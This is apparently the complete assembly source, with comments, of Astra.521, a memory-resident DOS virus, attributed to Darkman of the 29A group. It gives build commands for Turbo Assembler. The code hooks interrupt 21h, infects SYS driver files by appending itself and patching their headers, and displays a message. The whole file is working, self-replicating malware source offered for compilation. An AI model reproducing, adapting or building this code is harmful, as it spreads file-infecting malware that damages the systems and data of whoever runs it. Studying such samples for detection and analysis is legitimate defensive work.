;              'ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿'
;               º ****:::: Disassembly - Astra.521 ::::*** º
;               º ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ º
;               º ********* -= Darkman / 29A =- ********** º
;              'ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ'


; Astra.521 is a 521 bytes parasitic resident SYS virus. Infects files at find
; next matching file (DTA) by appending the virus to the infected file.

; To compile Astra.521 with Turbo Assembler v 4.0 type:
;   TASM /M ASTRA521.ASM
;   TLINK /x ASTRA521.OBJ
;   EXE2BIN ASTRA521.EXE ASTRA521.COM


.model tiny
.code

code_begin:
	     push    cs ax		 ; Save registers at stack

	     call    delta_offset
delta_offset:
	     pop     ax 		 ; Load AX from stack
	     sub     ax,offset delta_offset

	     push    cx 		 ; Save CX at stack
	     mov     cl,04h		 ; Divide by paragraphs
	     shr     ax,cl		 ; AX = delta offset in paragraphs
	     mov     cx,cs		 ; CX = code segment
	     add     ax,cx		 ; AX = relocated CS
	     pop     cx 		 ; Load CX from stack
	     push    ax 		 ; Save AX at stack

	     lea     ax,virus_begin	 ; AX = offset of virus_begin
	     push    ax 		 ; Save AX at stack

	     retf			 ; Return far!
virus_begin:
	     pop     ax 		 ; Load AX from stack
	     pop     word ptr cs:[int_rou_addr+02h]

	     push    ds es ax cx si di	 ; Save registers at stack

	     mov     ax,word ptr cs:[int_rou_addr]
	     mov     ds,word ptr cs:[int_rou_addr+02h]
	     mov     word ptr ds:[08h],ax

	     xor     ax,ax		 ; Zero AX
	     mov     ds,ax		 ; DS = segment of interrupt table
	     mov     ax,ds:[21h*04h]	 ; AX = offset of interrupt 21h
	     mov     word ptr cs:[int21_addr],ax
	     mov     ax,ds:[21h*04h+02h] ; AX = segment of interrupt 21h
	     mov     word ptr cs:[int21_addr+02h],ax

	     cld			 ; Clear direction flag
	     xor     si,si		 ; Zero SI
	     mov     es,si		 ; ES = segment of interrupt table

	     push    cs 		 ; Save CS at stack
	     pop     ds 		 ; Load DS at stack (CS)

	     mov     ax,0ff05h		 ; Astra.521 function
	     pushf			 ; Save flags at stack
	     call    cs:[int21_addr]
	     cmp     ax,5ffh		 ; Already resident?
	     je      virus_exit 	 ; Equal? Jump to virus_exit

	     xor     si,si		 ; Zero SI
	     mov     di,200h		 ; DI = offset above interrupt table
	     mov     cx,(code_end-code_begin)
	     cli			 ; Clear interrupt-enable flag
	     rep     movsb		 ; Move virus above interrupt table

	     cli			 ; Clear interrupt-enable flag
	     mov     word ptr es:[21h*04h],offset int21_virus
	     mov     word ptr es:[21h*04h+02h],20h
virus_exit:
	     pop     di si cx ax es ds	 ; Load registers from stack

	     db      0eah		 ; JMP imm32 (opcode 0eah)
int_rou_addr dd      ?			 ; Address of interrupt routine
	     db      '(C) AsTrA,1990'
size_offset  dw      ?			 ; Filesize/offset of virus within ...

int21_virus  proc    near		 ; Interrupt 21h of Astra.521
	     pushf			 ; Save flags at stack

	     cmp     ax,0ff05h		 ; Astra.521 function?
	     jne     test_std_str	 ; Not equal? Jump to test_std_str

	     mov     ax,5ffh		 ; Already resident

	     iret			 ; Interrupt return!
test_std_str:
	     cmp     ah,09h		 ; Write string to standard output
	     jne     tst_find_nxt	 ; Not equal? Jump to tst_find_nxt

	     push    ax dx ds		 ; Save registers at stack

	     xor     dx,dx		 ; Zero DX
	     mov     ds,dx		 ; DS = segment of interrupt table

	     test    byte ptr ds:[46dh],00000001b
	     jz      tst_std_exit	 ; Odd number of timer ticks since...?

	     cli			 ; Clear interrupt-enable flag

	     push    cs 		 ; Save CS at stack
	     pop     ds 		 ; Load DS at stack (CS)

	     lea     dx,message 	 ; DX = offset of message
	     pushf			 ; Save flags at stack
	     call    cs:[int21_addr]
tst_std_exit:
	     pop     ds dx ax		 ; Load registers from stack
tst_find_nxt:
	     cmp     ah,4fh		 ; Find next matching (DTA)?
	     jne     int21_exit 	 ; Not equal? Jump to int21_exit

	     pushf			 ; Save flags at stack
	     push    ax bx cx dx si di bp ds es

	     mov     bp,sp		 ; BP = stack pointer

	     mov     ah,2fh		 ; Get disk transfer area address
	     pushf			 ; Save flags at stack
	     call    cs:[int21_addr]

	     push    es 		 ; Save ES at stack
	     pop     ds 		 ; Load DS at stack (ES)

	     mov     dx,bx		 ; DX = offset of disk transfer area
	     add     dx,1eh		 ; DX = offset of filename
	     cli			 ; Clear interrupt-enable flag
	     call    open_file

	     mov     sp,bp		 ; SP = stack pointer

	     pop     es ds bp di si dx cx bx ax
	     popf			 ; Load flags from stack
int21_exit:
	     popf			 ;  "     "    "     "

	     db      0eah		 ; JMP imm32 (opcode 0eah)
int21_addr   dd      ?			 ; Address of interrupt 21h
	     endp

message      db      0dh,0ah,'I like fragrant smell of flower!',0dh,0ah,'$'

open_file    proc    near		 ; Open file
	     mov     ax,3d02h		 ; Open file (read/write)
	     pushf			 ; Save flags at stack
	     call    cs:[int21_addr]
	     jnc     read_file		 ; No error? Jump to read_file

	     ret			 ; Return!
read_file:
	     mov     bx,ax		 ; BX = file handle
	     mov     cx,02h		 ; Read two bytes
	     mov     ah,3fh		 ; Read from file

	     push    cs 		 ; Save CS at stack
	     pop     ds 		 ; Load DS at stack (CS)

	     lea     dx,sys_header	 ; DX = offset of sys_header
	     pushf			 ; Save flags at stack
	     call    cs:[int21_addr]

	     cmp     word ptr cs:[sys_header],0ffffh
	     je      set_file_pos	 ; Equal? Jump to set_file_pos

	     jmp     close_file
set_file_pos:
	     mov     ax,4202h		 ; Set current file position (EOF)
	     xor     cx,cx		 ; Zero CX
	     mov     dx,cx		 ; Zero DX
	     pushf			 ; Save flags at stack
	     call    cs:[int21_addr]
	     mov     cs:[size_offset],ax ; Store filesize

	     xor     cx,cx		 ; Zero CX
	     mov     dx,cs:[size_offset] ; DX = filesize
	     sub     dx,02h		 ; DX = offset of end of file - 02h
	     mov     ax,4200h		 ; Set current file position (SOF)
	     pushf			 ; Save flags at stack
	     call    cs:[int21_addr]

	     mov     ah,3fh		 ; Read from file

	     push    cs 		 ; Save CS at stack
	     pop     ds 		 ; Load DS at stack (CS)

	     lea     dx,sys_header	 ; DX = offset of sys_header
	     mov     cx,01h		 ; Read one byte
	     pushf			 ; Save flags at stack
	     call    cs:[int21_addr]

	     cmp     cs:[sys_header],'5' ; Already infected?
	     jne     set_file_po_	 ; Not equal? Jump to set_file_po_

	     jmp     close_file
set_file_po_:
	     xor     cx,cx		 ; Zero CX
	     mov     dx,08h		 ; DX = offset of interrupt routine
	     mov     ax,4200h		 ; Set current file position (SOF)
	     pushf			 ; Save flags at stack
	     call    cs:[int21_addr]

	     mov     ah,3fh		 ; Read from file

	     push    cs 		 ; Save CS at stack
	     pop     ds 		 ; Load DS at stack (CS)

	     lea     dx,int_rou_addr	 ; DX = offset of int_rou_addr
	     mov     cx,02h		 ; Read two bytes
	     pushf			 ; Save flags at stack
	     call    cs:[int21_addr]

	     mov     dx,cs:[size_offset] ; DX = filesize
	     and     dx,1111111111110000b
	     add     dx,10h		 ; DX = offset of virus within file
	     mov     cs:[size_offset],dx ; Store offset of virus within file

	     xor     cx,cx		 ; Zero CX
	     mov     ax,4200h		 ; Set current file position (SOF)
	     pushf			 ; Save flags at stack
	     call    cs:[int21_addr]

	     mov     cx,(code_end-code_begin)
	     xor     dx,dx		 ; Zero DX
	     mov     ah,40h		 ; Write to file
	     pushf			 ; Save flags at stack
	     call    cs:[int21_addr]

	     xor     cx,cx		 ; Zero CX
	     mov     dx,08h		 ; DX = offset of interrupt routine
	     mov     ax,4200h		 ; Set current file position (SOF)
	     pushf			 ; Save flags at stack
	     call    cs:[int21_addr]

	     lea     dx,size_offset	 ; DX = offset of size_offset
	     mov     cx,02h		 ; Write two bytes
	     mov     ah,40h		 ; Write to file
	     pushf			 ; Save flags at stack
	     call    cs:[int21_addr]

	     xor     cx,cx		 ; Zero CX
	     mov     dx,cs:[size_offset] ; DX = offset of virus within file
	     add     dx,(code_end-code_begin)
	     mov     ax,4200h		 ; Set current file position (SOF)
	     pushf			 ; Save flags at stack
	     call    cs:[int21_addr]

	     mov     cx,00h		 ; Truncate file
	     mov     ah,40h		 ;    "      "
	     pushf			 ; Save flags at stack
	     call    cs:[int21_addr]
close_file:
	     mov     ah,3eh		 ; Close file
	     pushf			 ; Save flags at stack
	     call    cs:[int21_addr]

	     ret			 ; Return!
	     endp

	     db      '(5)'
code_end:
sys_header   db      02h dup(?) 	 ; SYS header
data_end:

end	     code_begin
